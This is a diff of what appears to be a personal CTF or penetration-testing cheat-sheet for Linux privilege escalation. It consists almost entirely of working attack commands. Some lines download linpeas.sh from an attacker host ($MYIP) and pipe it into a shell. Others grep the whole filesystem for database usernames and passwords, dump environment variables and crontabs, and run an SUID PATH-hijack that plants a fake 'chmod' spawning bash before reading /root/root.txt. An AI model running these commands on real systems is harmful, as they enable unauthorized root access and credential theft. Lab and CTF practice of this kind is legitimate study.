@@ -1225,27 +1225,28 @@ curl -s http://$MYIP:8888/linux/linpeas.sh | sh
 wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh
 
 [*] Privilege Escalation
-+---------- Initial Checks ----------+
-echo -e '\n\n'; ls -laR /home /opt
-echo -e '\n\n'; find / -perm /4000 2>/dev/null | xargs ls -la
-echo -e '\n\n'; cat /etc/crontab
-echo -e '\n\n'; cat /proc/self/environ | tr '\0' '\n' | sort
-echo -e '\n\n'; netstat -tuln
-echo -e '\n\n'; sudo -l
-
-+---------- Group Files ----------+
-find / -group developer 2>/dev/null
-find / -group sysadm 2>/dev/null
-
-+---------- Change to Group ----------+
++---------- Priv Check ----------+
+id
 newgrp developer
-newgrp sysadm
+find / -group developer 2>/dev/null
+(grep -IrinE '^\s*db[-_]?user\w*\s*=\s*|^\s*db[-_]?pass\w*\s*=\s*' / 2>/dev/null &)
+
++---------- Initial Checks ----------+
+echo -e '\n\n'; sudo -l;echo -e '\n\n'; ls -laR /home /opt;echo -e '\n\n'; find / -perm -4000 2>/dev/null | xargs ls -la;echo -e '\n\n'; cat /etc/crontab;echo -e '\n\n'; cat /proc/self/environ | tr '\0' '\n' | sort;echo -e '\n\n'; ss -nlte
 
 +---------- Linpeas Scan ----------+
 curl -s http://$MYIP:8888/linux/linpeas.sh | sh
 
-+---------- Find Usernames / Passwords ----------+
-(grep -IrinE '^\s*db[-_]?user\w*\s*=\s*|^\s*db[-_]?pass\w*\s*=\s*' / 2>/dev/null &)
++---------- None Absolute Path (suid) ----------+
+strace -f -o file /usr/local/bin/suid-name
+cat file | grep -rine '"chmod"'
+env -i bash --norc --noprofile
+TEMPFOLDER=$(mktemp -d)
+printf %s '/bin/bash -i' > $TEMPFOLDER/chmod
+chmod +x $TEMPFOLDER/chmod
+export PATH=$TEMPFOLDER:$PATH
+/usr/local/bin/suid-name
+cat /root/root.txt
 
 +---------- Polkit Version ----------+
 rpm -qa | grep -i polkit | grep -i "0.11[3-9]"
